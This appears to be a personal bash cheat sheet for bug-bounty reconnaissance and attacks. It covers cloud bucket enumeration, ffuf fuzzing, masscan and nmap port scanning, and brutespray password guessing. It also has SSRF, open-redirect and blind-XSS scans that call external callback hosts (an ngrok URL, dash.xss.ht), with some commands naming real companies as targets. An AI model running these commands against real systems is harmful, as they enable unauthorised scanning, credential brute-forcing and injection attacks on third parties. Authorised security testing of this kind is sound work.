#!/bin/bash

# check out
  go get -u github.com/proabiral/inception;

# cloud bucket
  git clone https://github.com/0xsha/CloudBrute 
  CloudBrute -d target.com -k target -m storage -t 80 -T 10 -w "./data/storage_small.txt"
  python ./s3scanner.py -l chorus.ai -d -o bucket.txt
  ruby lazys3.rb google
  
# cloud security

  git clone https://github.com/m0rtem/CloudFail.git
  cd CloudFail
  pip3 install -r requirements.txt
  python3 cloudfail.py --target fireeye.com 

# url anaysis
  python3 DumpsterDiver.py -p fireeye --level 3 -s -r -o fireeye.json

  git clone https://github.com/KathanP19/JSFScan.sh.git
  sudo chmod +x install.sh
  ./install.sh
  ./JSFScan.sh -l -e -s -m -d -f url/js -o url/JSFScan_result
   
  git clone https://github.com/iamj0ker/bypass-403
  cd bypass-403
  chmod +x bypass-403.sh

# Content Discovery
  /root/go/bin/./ffuf -u $1/FUZZ -w /root/tools/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -r
  /root/go/bin/./ffuf -u $1/FUZZ -w /root/wordlist/apiwordlist.txt -r -t 200
  cat /root/targets/$1/*.ffuf | sort -u | tee -a /root/newtargets/$1/content_discovered.txt
  ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w ~/tools/dirsearch/db/ffuf_extension.txt
# Gathering IP Addresses 
  cat $CUR_DIR/all.txt | xargs -n1 -P10 -I{} python3 ~/tools/recon/getip.py {} 2> /dev/null|grep IP | awk '{print $2}' | sort -u | tee -a $CUR_DIR/ip.txt

  cat $CUR_DIR/ip.txt | python3 ~/tools/Shodanfy.py/shodanfy.py --stdin --getvuln --getports --getinfo --getbanner | tee -a $CUR_DIR/shodan.txt
  massscan -p1-65535 ip --max-rate 1800 -oG outputfile.txt
  masscan -p80,443,8020,50070,50470,19890,19888,8088,8090,2075,2076,6443,3868,3366,8443,8080,9443,9091,3000,8000,5900,8081,6000,10000,8181,3306,5000,10000,4000,8888,5432,15672,9999,161,4044,7077,4040,9000,8089,7447,7080,8880,8983,5673,7443,19000,19080 --rate=100000 --open -iL $1 --banners -oG famous_ports.txt
  Portanalysis - Dnmasscan	
  dnmasscan outputfile.txt dns.log -p80,443 -oG masscan.log
  # Service scanning - Brutespray	scan the remote administration protocls for default passwords which takes nmap OG file
  Massscan -> nmapservice scan -oG -> brutespray credential bruteforce

  #vulners nmap script to find vulnerabilities installation
  #git clone https://github.com/scipag/vulscan scipag_vulscan
  ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan    
  To run:- nmap -sV --script=vulscan/vulscan.nse www.example.com
  nmap -sS -sU -sV -p- url without HTTP

# attack 
  ./ssrfire.sh payfit.com  http://280bcfcd.ngrok.io hosts
  ./ssrfhussien.sh paytm.com  http://280bcfcd.ngrok.io
  
  git clone https://github.com/BountyStrike/Injectus.git
  pip3 install -r requirements.txt
  python3 openredirex.py -u "https://vulnerable.com/?url=FUZZ" -p payloads.txt --keyword FUZZ  
  
  xsstrike
  xsser -i /root/Bug-Bounty-Tools/subdomains.lst --auto --reverse-check --Str --Coo --Xsa --Xsr --Ind --Anchor --Dcp --Dom -c 99999 --Cw=50 --delay=1 --save  --Phpids0.6.5  --Phpids0.7 --Imperva --Webknight --F5bigip --Barracuda --Modsec --Quickdefense --heuristic --threads=10 
  
  Dalfox:
    cat urls/2xx | qsreplace -a | dalfox pipe -blind
     echo "target.com" | waybackurls | grep "=" | dalfox pipe -b https://dash.xss.ht
    dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://dash.xss.ht
    dalfox file urls_file --custom-payload ./mypayloads.txt
    cat urls_file | dalfox pipe -H "AuthToken: bbadsfkasdfadsf87"  
    for i in `cat ../bounty-targets-data/data/domains.txt `; do echo "$i" | waybackurls | grep "=" | ~/go/bin/dalfox pipe -b https://dash.xss.ht; done


# yet to assign
  [ -s apiwords.txt ] && echo "JSP Urls saved to apiwords.txt"
